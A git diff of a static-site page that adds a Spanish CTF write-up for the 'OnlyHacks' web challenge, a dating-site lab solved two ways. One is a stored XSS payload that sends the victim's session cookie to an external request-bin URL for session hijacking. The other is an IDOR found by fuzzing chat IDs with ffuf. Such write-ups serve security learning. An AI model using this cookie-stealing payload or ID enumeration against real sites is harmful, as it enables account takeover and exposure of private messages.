@@ -15,7 +15,7 @@
   
   
   
-  <link rel="canonical" href="http://localhost:1313/htb/" />
+  <link rel="canonical" href="http://localhost:1313/challenges/onlyhacks/onlyhacks-1a109437380080188e4bd7f00643ea1c/" />
   
   
   
@@ -70,28 +70,31 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/htb/">
+  <meta property="og:url" content="http://localhost:1313/challenges/onlyhacks/onlyhacks-1a109437380080188e4bd7f00643ea1c/">
   <meta property="og:site_name" content="Loaxert">
   <meta property="og:title" content="Loaxert">
+  <meta property="og:description" content="OnlyHacks # Category: Web Difficulty: Easy Status: Completed Has Notes: Yes WriteUp Status: Draft WriteUp URL: https://www.">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
+    <meta property="article:section" content="challenges">
 
   
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Loaxert">
+  <meta name="twitter:description" content="OnlyHacks # Category: Web Difficulty: Easy Status: Completed Has Notes: Yes WriteUp Status: Draft WriteUp URL: https://www.">
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Loaxert",
+    "articleSection": "",
     "name": "",
     "headline": "",
     
-    
+    "abstract": "OnlyHacks # Category: Web Difficulty: Easy Status: Completed Has Notes: Yes WriteUp Status: Draft WriteUp URL: https:\/\/www.",
     "inLanguage": "es",
-    "url" : "http:\/\/localhost:1313\/htb\/",
+    "url" : "http:\/\/localhost:1313\/challenges\/onlyhacks\/onlyhacks-1a109437380080188e4bd7f00643ea1c\/",
     "author" : {
       "@type": "Person",
       "name": "Santiago Chavarro"
@@ -105,7 +108,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "0"
+    "wordCount": "295"
   }]
   </script>
 
@@ -635,6 +638,81 @@
 
         <div class="article-content max-w-prose mb-20">
           
+
+<h1 class="relative group">OnlyHacks 
+    <div id="onlyhacks" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#onlyhacks" aria-label="Ancla">#</a>
+    </span>        
+    
+</h1>
+<p>Category: Web
+Difficulty: Easy
+Status: Completed
+Has Notes: Yes
+WriteUp Status: Draft
+WriteUp URL: <a href="https://www.youtube.com/watch?v=PsjCU9VnIxc" target="_blank">https://www.youtube.com/watch?v=PsjCU9VnIxc</a>
+Concepts: Insecure Direct Object Reference (IDOR), XSS
+Completion Date: February 20, 2025</p>
+<p>Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="OnlyHacks%201a109437380080188e4bd7f00643ea1c/image.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>Dentro podremos ver una web de citas en la que la unica persona interesante es Renata ya que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="OnlyHacks%201a109437380080188e4bd7f00643ea1c/image%201.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>En este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting yla otra es modifcando la url ya que podemos ver que cada chat tiene un id.</p>
+<p>Vamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hi<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="OnlyHacks%201a109437380080188e4bd7f00643ea1c/image%202.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>Vamos a tratar de consegir la cookie de su sesion con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://requestbin.whapi.cloud/19bdo3d1?
+</span></span></span><span class="line"><span class="cl"><span class="s1">c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Vamos a ir a esta pagina <a href="http://requestbin.whapi.cloud/" target="_blank">http://requestbin.whapi.cloud/</a> crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="OnlyHacks%201a109437380080188e4bd7f00643ea1c/image%203.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>Remplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="OnlyHacks%201a109437380080188e4bd7f00643ea1c/image%204.png" alt="image.png" />
+      
+    </figure>
+</p>
+<p>Ahora vamos con la segunda forma</p>
+<p>Cuando entramos al chat de renata podemos ver como la url es:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">http://94.237.55.96:37246/chat/?rid=6
+</span></span></code></pre></div><p>Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Creamos el diccionario</span>
+</span></span><span class="line"><span class="cl">sed <span class="m">1</span> <span class="m">100</span> &gt; id.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ffuf -w id.txt -u <span class="s1">&#39;http://94.237.55.96:37246/chat/?rid=FUZZ&#39;</span> -H <span class="s2">&#34;Cookie: session=TUCOOKIE&#34;</span> -mc <span class="m">200</span>
+</span></span></code></pre></div><p>Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos la flag.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="OnlyHacks%201a109437380080188e4bd7f00643ea1c/image%205.png" alt="image.png" />
+      
+    </figure>
+</p>
+
           
           
           
@@ -656,8 +734,8 @@
           
         
       <script>
-        var oid = "views_HTB\/index.html"
-        var oid_likes = "likes_HTB\/index.html"
+        var oid = "views_Challenges\/OnlyHacks\/OnlyHacks 1a109437380080188e4bd7f00643ea1c.md"
+        var oid_likes = "likes_Challenges\/OnlyHacks\/OnlyHacks 1a109437380080188e4bd7f00643ea1c.md"
       </script>
       
       
@@ -669,13 +747,78 @@
 
     
   
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/htb/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  ></span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="0001-01-01T00:00:00&#43;00:00">1 enero 0001</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/challenges/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  ></span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="0001-01-01T00:00:00&#43;00:00">1 enero 0001</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
 
 
     
   </footer>
 </article>
 
-      
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Ir arriba" title="Ir arriba">
+    &uarr;
+  </a>
+</div>
     </main><footer id="site-footer" class="py-10 print:hidden">
   
   
